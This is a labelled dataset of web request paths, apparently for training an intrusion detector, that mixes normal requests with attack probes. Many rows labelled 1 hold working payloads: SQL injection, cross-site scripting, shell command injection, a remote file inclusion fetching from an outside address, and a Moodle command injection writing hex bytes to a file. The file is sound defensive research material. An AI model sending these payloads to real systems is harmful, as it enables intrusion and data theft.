request	label
/ manual / ja / platform / windows . html 	0
/ string / strings / parameters = |   [  7 -ne  $  ( echo ajewoj  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  ' 	1
/ set-72157594383165509 / 	0
/ qaf - 512 / 	0
/ javascript / compact . bat 	0
/ email_add / 	0
/ string / modo = insertar & precio = any ?   set-cookie :  + tamper = 1041264011025374727 & b1 = confirmar 	1
/ link-156 / 	0
/ string / modo = entrar & login =  |  & pwd = caprifolicea & remember = on & b1 = entrar 	1
/ cfajax / 	0
/ 90x90_20061212222413 / 	0
"/ fc9t54l7 . cgi ?  < script > document . cookie =  "" testggad = 2000 ;  ""  <  / script > "	1
/ string / id = 2 & nombre = jamn + ibrico & precio = 100 & cantidad = 15 & b1 = aadir + al + carrito 	0
/ opensiteadmin / scripts / classes / fieldmanager . php ? path = http :  /  / 192 . 168 . 202 . 96 : 8080 / no4ghqiguzhst ?  \ x00 	1
/ string / strings / parameters = gran @ fernandosoto . ch 	0
/ cacti / sendcard . php ? view = 1 & id =  ' sendcard_sql . nasl 	1
/ string / modo = registro & login = elnore & password = azoem $ ia & nombre = fredesvinda & apellidos = bazet + aguil & email = latimer @ puntodevistafotografia . ve & dni = 65358703v & direccion = vacas + de + san + juan + 153 +  & ciudad = ribera + del + fresno & cp = 46177 & provincia = valladolid & ntc = 0288508062311799 & b1 = registrar 	0
"/ vjbrrppi . php3 ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = tarjetn 	0
"/ string / strings / parameters = 1 ""  ""  or 5286 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  ""  "" uosc ""  ""  =  ""  "" uosc "	1
/ 615751 / 	0
/ odds-wizard / 	0
"/ raanw4ia . php ?  < img src =  "" javascript : alert ( cross_site_scripting . nasl )  ;  ""  > "	1
/ string / strings / parameters = 1 )  )  as khvx where 7533 = 7533 union all select null , null , null , null , null , null , null , null -- 	1
/ string / modo = registro & login = sati & password = ahe2hadora & nombre = nicarda & apellidos = regla + casiano & email = terhune @ multireform . tn & dni = 58743816e & direccion = c /  + ingeniero + cajal + lasala + 31 + 5 ? f & ciudad = beneixama & cp = 44222 & provincia = toledo & ntc = 1503380912783621 & b1 = registrar 	0
/ 043427 / 	0
/ btchans1-thumb / 	0
/ lowendmac / 	0
/ 174097 / 	0
/ string / strings / parameters = 5n37do 	0
/ treepsfm / 	0
/ graduateexit / 	0
/ 2171675 / 	0
/ linux-4 / 	0
"/ uvazfs7p . htm ?  < meta http-equiv = set-cookie content =  "" testwtbo = 4831 ""  > "	1
/ tyreexhibitj / 	0
/ javascript / backups . conf 	0
/ string / strings / parameters = phillida 	0
/ string / modo = entrar & login = chandras & pwd = h + olgona & remember =  ?  & b1 = entrar 	1
/ string / strings / parameters = &  & echo awxhoa $  (  ( 97 + 59 )  )  $  ( echo awxhoa ) awxhoa | 	1
/ index1035 / 	0
/ projects / weatimages / demo / index . php ? ini [ langpack ]  = xxpathxx 	1
/ mimg-6tfn2y / 	0
"/ string / strings / parameters = < xml id = xss >  < x >  < c >  <  !  [ cdata [  < img id = xss src =  ""  "" javas ]  ]  >  <  !  [ cdata [ cript : alert (  ' xss '  )  ;  ""  ""  >  ]  ]  >  <  / c >  <  / x >  < xml >  < span dataid = xss src =  # i datafld = cdataformatas = html >  <  / span > "	1
/ string / strings / parameters = keung 	0
/ javascript / sell . dump 	0
/ javascript /  . passwd . save 	1
/ string / modo = insertar & precio = 8533 & b1 = pasar + por + caja 	0
/ string / modo = registro & login = loewen & password = ovil & nombre = reagan @ 40 & apellidos = piulachs + casaramon & email = diogene @ acch-portugal . mq & dni = 29385199p & direccion = c /  + huesca ,  + 171 +  & ciudad = luzn & cp = 15863 & provincia = valladolid & ntc = 0586261319391409 & b1 = registrar 	1
/ bittorrent_455520 / 	0
/ ref010701 / 	0
/ string / strings / parameters = pennebak 	0
/ 1004337728 / 	0
/ annoy13 / 	0
/ string / strings / parameters = '  )  ;  alert (  ' xss 	1
"/ string / strings / parameters = ""  |  | echo $ ifsgsymfu $  (  ( 44 + 78 )  )  $  ( echo $ ifsgsymfu ) gsymfu & "	1
/ 203023 / 	0
"/ moodle / filter / tex / texed . php ? formdata = foo & pathname = foo ""  +  |  |  + echo + db + d0 + 8b + 04 + 91 + 01 + f0 + 89 + 45 + f0 + eb + 06 + 43 + 3b + 5d + f4 + 72 + d4 + 89 + ec + 61 + 8b + 44 + 24 + d0 + c2 +  +  >  > ctdn "	1
/ string / strings / parameters = 1 '  )  or 8466 = benchmark ( 5000000 , md5 ( 0x694a4745 )  ) 	1
/ ecs_geforce6100sm / 	0
/ 000122104 / 	0
/ string / modo = insertar & precio = 8732 & b1 = pasar + por + caja 	0
"/ string / strings / parameters = ""  & echo $ ifsvyulfc $  (  ( 89 + 15 )  )  $  ( echo $ ifsvyulfc ) vyulfc ' "	1
